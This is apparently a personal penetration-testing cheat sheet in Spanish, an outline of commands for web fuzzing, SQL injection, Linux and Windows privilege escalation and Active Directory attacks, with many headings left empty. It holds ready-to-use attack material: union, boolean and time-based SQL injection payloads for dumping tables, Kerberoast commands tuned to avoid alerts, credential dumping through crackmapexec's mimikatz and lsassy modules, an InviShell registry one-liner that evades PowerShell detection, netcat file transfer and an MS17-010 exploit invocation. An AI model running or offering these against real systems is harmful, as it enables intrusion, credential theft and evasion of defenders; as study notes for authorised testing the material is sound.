
Herramientas generales:
	-Burpsuite:
		-Proxy: Herramienta necesaria para interceptar peticiones HTTP/HTTPS.
		-Repeater: Herramienta utilizada para modificar y manipular una petición.
        -Intruder: Herramienta utilizada para realizar ataques de fuerza bruta/reemplazo de valores.
        -Chisel/Socat: Herramienta que permite realizar reenvio de puertos entre sistemas.
    -Netcat:
        -Herrmienta liviana para establecer conexiones via TCP/UDP.
            -Establecer una conexión hacia un puerto remoto: nc 1.1.1.1 443 -vvv
            -Recepcionar una conexión desde un host remoto: nc -lvp 443
            -Enviar datos a través de netcat: nc 1.1.1.1 443 < dato.txt
            -Recibir datos a través de netcat: nc -lvp 443 > dato.txt
    -Python3:
        -Lenguaje de programación interpretado de gran versatilidad.
            -Desplegar un servidor web: python3 -m http.server 80
            -Desplegar un servidor ftp: python3 -m pyftpdlib 21
        -Paqueteria impacket:
            -Desplegar un servidor smb: impacket-smbserver remoteShare localShare
            -Desplegar un relay smb: impacket-smbrelayx
        -Responder: Herramienta utilizada para el envenenamiento de peticiones para multiples protocolos, entre ellos HTTP,DNS,SMB,FTP.
     -Rubeus: Herramienta que permite realizar ataques de Kerberoast.
            Ejemplo #01 identificar y validar usuarios: Rubeus.exe kerberoast /stats
            Ejemplo #02 generar ataque contra la cuenta "accountservice": Rubeus.exe kerberoast /user:accountservice                    /simple /outfile: Path/to/hashoutput
			Ejemplo #03 generar ataque evitando alertas de downgrade de protocolos: Rubeus.exe kerberoast                               /user:accountservice /rc4opsec /outfile: Path/to/hashoutput

Utiles:
    Busqueda por cadenas de texto en CMD: type ARCHIVO.txt | findstr "Password"
    Busqueda por cadenas de texto en Powershell: type ARCHIVO.txt | Select-String -Pattern "Password" 

Pentest de aplicaciones WEB.
    -Fuzzing: Técnica utilizada para enumerar directorios o ficheros existentes en el sitio web.
        -Wfuzz:
            Fuzzing de directorios: wfuzz -c -L --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://1.1.1.1/FUZZ
            Fuzzing de subdominios: wfuzz -c -L --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H 'Host: FUZZ.dominio.com' http://dominio.com
            Fuzzing de ficheros(Añadir extensión al final): wfuzz -c -L --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://1.1.1.1/FUZZ.txt
        -Gobuster:
            Fuzzing de directorios: gobuster dir -U 192.168.10.10 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
    -SQLi
        -Error based SQLi: Inyección basada en romper la estructura de la query para visualizar el error, entender la consulta y alterar la misma.
        Posibles payloads a probar: ' ) - ( , . ; : { } 
            -Enumeración de cantidad de columnas: union select 1,2,3,4... (Hasta que el error desaparezca)
            -Enumeración de base de datos utilizando la función "database()": union select 1,2,database();
            -Enumeración de tablas utilizando la base de datos "information": union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = "Nombre de la BD";
            -Enumeración de columnas utilizando la base de datos "information": union select 1,2,group_concat(column_name) from information_schema.columns where table_name = "Nombre de la tabla"'
            -Desplegar información de la tabla: union select 1,2,group_concat(columna1, ":", columna2 SEPARATOR '<br>') from TABLA01;
         -Time boolean SQLi: Inyección basada en la respuesta el boolean de respuesta".
            -Enumeración de base de datos utilizando "like" letra a letra (script): union select 1,2,3 where database() like '%a';-- 
            -Enumeración de tablas utilizando "like" letra a letra (script): union select 1,2,3 from information_schema.tables where table_schema = 'DB' and table_name like 'a%';--
            -Enumeración de columnas utilizando "like" letra a letra (script): union select 1,2,3 from information_schema.columns where table_schema = 'DB' and table_name = 'tabla01' and column_name like '%a' and column_name != 'id';--
         -Time based SQLi: Inyección basada en pausas cuando el condicional es "true".
            -Enumeración de base de datos utilizando "like" y "sleep()"(script): union select 1,sleep(1) and database() like 'd%';--
            -Enumeración de tablas utilizando "like" letra a letra (script): union select 1,sleep(1) from information_schema.tables where table_schema = 'DB' and table_name like 'a%';--
            -Enumeración de columnas utilizando "like" letra a letra (scriptt): union select 1,sleep(1) from information_schema.columns where table_schema = 'DB' and table_name = 'tabla01' and column_name like '%a';--
    -XSS
    -XXE
    -SSRF
    -LFI
    -RDI
    -XPath injection
    -LDAP injection
    
Pentest sobre linux.
    -Herramientas
        -linPEAS: Es una herramienta de enumeración e identificación con fines de encontrar posibles vias para escalar privilegios.
    -Descubrimiento de puertos
    -Enumeración
        -Sistema operativo: uname -a
        -Interfaces de red: ip a / ifconfig 
		-Rutas a nivel de red: ip r
        -Puertos abiertos de forma local: netstat -anp / ss -lntu / cat /proc/net/tcp | awk '{print $2}' / cat /proc/net/udp | awk '{print $2}'
        -Endpoints asociados: cat /etc/hosts
		-Procesos ejecutandose: ps aux
		-Grupos asociados a un usuario: id / id user
		-Privilegios de sudo de un usuario: sudo -l
		-Binarios con privilegios SUID: find / -perm -4000 2>/dev/null
        
    -Identificación de exploits
    -Troubleshooting
    -Escalación de privilegios
        -Binarios SUID conocidos: Abusando de ficheros que tienen el permiso SUID es posible ejecutar comandos en el contexto de root cuando root es el dueño. Utilizando páginas como https://gtfobins.github.io/ o https://book.hacktricks.xyz/ podemos verificar si los ficheros SUID conocidos cuentan con vulnerabilidades.
        -Binarios SUID no conocidos: Es posible abusar de ficheros SUID 
    -Pivoting
    -BufferOverflow (x86,x64)
    
Pentest sobre windows.
    -Herramientas
        -winPEAS: Es una herramienta de enumeración e identificación con fines de econtrar posibles vias para escalar privilegios.
        -impacket-psexec: Herramienta que permite realizar una conexión directa utilizando el protocolo SMB (445).
    -Descubrimiento de puertos
    -Enumeración
        -Enumerar usuarios:
            net user
        -Enumerar parches instalados:
            wmic qfe get Caption,Description,HotFixID,InstalledOn
        -Enumerar sistema en general:
            systeminfo
        -Enumerar estado de Windows Defender(Powershell):
            (Get-Service windefend).Status
        -Enumerar servicios activos:
            wmic service list brief | findstr "Running"
        -Enumerar tareas programadas:
            schtasks
        -Enumeración local: 
            -Enumerar todos los datos del usuario actual: whoami /all
            -Enumerar todos los grupos del usuaro actual: whoami /group
            -Enumerar privilegios heredados del usuario actual: whoami /priv
            -Enumerar detalles del sistema: systeminfo
        -Enumeracion de recursos compartidos utilizando null sessión.
            -smbclient -L 192.168.10.10 -N
            -smbmap -H 192.168.10.10 -u 'null'
		-Enumeración de recursos compartidos utilizando un usuario válido.
			-crackmapexec smb 192.168.10.10 -u user -p password --shares
		-Enumeración de usuarios utilizando un usuario válido:
			-GetADUsers.py -all -dc-ip 192.168.10.20 domain.local/user
		-Enumeración de servicios vulnerables:
			-powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws.output.txt
    -Identificación de exploits
    -Troubleshooting
    -Escalación de privilegios
        -DLL Hijacking: Es posible secuestrar la inclusión de una DLL no encontrada por un servicio. Utilizando herramientas como ProcMon, podemos verificar si existe alguna DLL no encontrada en la ejecución de un servicio. En caso de existir y poseer permisos de modificación sobre el directorio en cuestión, podemos incluir una DLL maliciosa para escalar o migrar de privilegios.
        -Unquoted path service: Es posible abusar de servicios mal referenciados, dada la forma en la que Windows busca los binarios dentro de un directorio de servicio y dado que las carpetas de Windows utilizan espacios, Windows intenta añadir el sufijo .exe a cada palabra dentro de un path.
            Ejemplo: C:\Program Files\Servicio Vulnerable\Ruta del binario\Binario.exe -> Windows intentará a añador el .exe a cada sección, dejando la ejecución: C:\Program Files\Servicio.exe, C:\Program Files\Servicio Vulnerable\Ruta.exe, C:\Program Files\Servicio Vulnerable\Ruta del binario\Binario.exe. Es necesario aclarar que es necesario contar con permisos de escritura algun direcotrio para poder incluir el binario malicioso.
        -Token Impersonate: Abusando del privilegio SeImpersonatePrivilege o SeChangeNotifyPrivilege es posible escalar privilegios utilizando Juicy Potato.
            Ejemplo: C:\Users\admin>whoami /priv

                    PRIVILEGES INFORMATION
                    ----------------------

                    Privilege Name                            Description                                                        State
                    ========================================= ================================================================== ========
                    SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
        -Credenciales en memoria: Utilizando software como Mimikatz es posible extraer credenciales que se encuentren almacenadas en memoría.
        -Exploit.
			MS17-10: https://github.com/helviojunior/MS17-010
				-python2 send_and_execute.py 10.10.10.10 ../exploit.exe 445 netlogon
    -Pivoting
    -BufferOverflow (x86,x64)
    
Pentest sobre Active Directory.
    -Herramientas
        -Bloodhound: Herramienta utilizada para realizar la enumeración de usuarios y grupos, asi como de posibles vectores para escalar privilegios. Bloodhound utilizada Neo4j para visualizar de forma gráfica los resultados.
            Ejemplo #1: SharpHound.ps1 Invoke-BloodHound -CollectionMethod All
            Ejemplo #2 evitando alertas de enumeración de sesiones: SharpHound.exe Invoke-BloodHound -CollectionMEthod All -ExcludeDomainControllers
        -PowerSploit: PowerSploit es un conjunto de herramientas escritas en powershell que posee multiples funciones para enumerar distintos atributos y caracteristicas del dominio utilizando el usuario autenticado que ejecuta los procesos.
            Ejemplo #1 enumerar OU's: Get-DomainOU.
            Ejemplo #2 enumerar GPO's: Get-DomainGPO.
            Ejemplo #3 enumerar GPO aplicada a una OU: Get-DomainGPO -Identity '{FCE16496-C744-4E46-AC89-2D01D76EAD68}'
            Ejemplo #4 enumerar forest local del dominio: Get-Forest | (Get-ADForest).Domains
            Ejemplo #5 enumerar confianza entre dominos: Get-DomainTrust | Get-ADTrust -Filter *
            Ejemplo #6 enumerar usuarios de un forest: Get-ADUser -Filter * -Server NOMBREDELFOREST
            Ejemplo #7 enumerar equipos donde el usuario es administrador local: Find-LocalAdminAccess -Verbose | Find-WMILocalAdminAccess.ps1 | Find-PSRemotingLocalAdminAccess.ps1
            Ejemplo #8 enumerar grupos a los que pertenece un grupo/usuario: Get-DomainGroup -UserName USUARIO
            Ejemplo #9 enumerar ACLs de un grupo sobre otro grupo: Get-DomainObjectAcl -Identity GRUPOFINAL -ResolveGUIDs | ForEach-Object {$_ |Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'GRUPOINICIAL'}
            Ejemplo #10 enumerar cuentas de servicio: Get-AdUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
        -InviShell: InviShell es una herramienta que permite esconder otras herramientas basadas en powershell, permite evadir restricciónes de ejecución y detección.
            Ejemplo no privilegiado (one liner desde CMD): 
                a) RunWithRegistryNonAdmin.bat;et COR_ENABLE_PROFILING=1;set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db} /f; reg add "HKCU\Software/Casses\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f; REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InviShellProf.dll" /f; powershell
         -ADModule: Modulos de Powershell que facilita la enumeración en entornos de Active Directory.
            Uso: Import-Module C:\Path\To\Microsoft.ActiveDirectory.Management.dll; Import-Module C:\Path\To\ActiveDirectory.psd1
            Ejemplo #1 enumerar Grupos a los que pertenece un usuario: Get-ADPrincipalGroupMembership -Identity USUARIO
            Ejemplo #2 enumerar Grupos a los que pertenece un grupo: Get-ADPrincipalGroupMembership -Identity GRUPO
    -Descubrimiento de puertos
    -Información de versiones
    -Enumeración remota:
        -Crackmapexec: Herramienta utilizada para enumerar de diversas formas.
            Ejemplo #1 enumeración básica: crackmapexec smb 192.168.10.200
            Ejemplo #2 enumeración credenciales: crackmapexec smb 192.168.10.200 administrator:password$.1
            Ejemplo #3 enumeración de usuarios con privilegios WINRM: crackmapexec winrm 192.168.10.200 administrator:password$.1     
			Ejemplo #4 enumeración de grupos: crackmapexec smb 192.168.10.200 user:password$1 --groups
			Ejemplo #5 enumeración de hashes utilizando el módulo mimikatz: crackmapexec smb -M mimikatz 192.168.10.200 administrator:password$.1
			Ejemplo #6 enumeración de hashes LSAS utilizando el modulo lsassy: crackmapexec smb -M lsassy 192.168.10.200 administrator:password$.1
		-GetUserSPNs.py
			Ejemplo #1 identificar usuarios con el atributo 'ServicePrincipalName': GetUserSPNs.py -dc-ip 192.168.10.200 domain.local/user
    -Ataques a Active Directory
        -Kerberoast: Es un ataque orientado a la obtención de un TGS (Ticket Granting Service) de una cuenta, dicho ticket              es un hash que contempla la contraseña de la cuenta, la obtención de ticket es silenciosa y dicho ticket puede puede ser crackeado con herramientas como John o Hashcat.
		-AS-Rep Roast: 
Ataque a contraseñas.
    -Crackeado con Jhon
    -Crackeado con Hashcat
    -Rainbow tables
    -Creación de diccionarios
    
Documentación.
    -Estructura informe
    -Lenguaje ejecutivo
    -Lenguaje técnico
    -Footprint
    -Evidencia
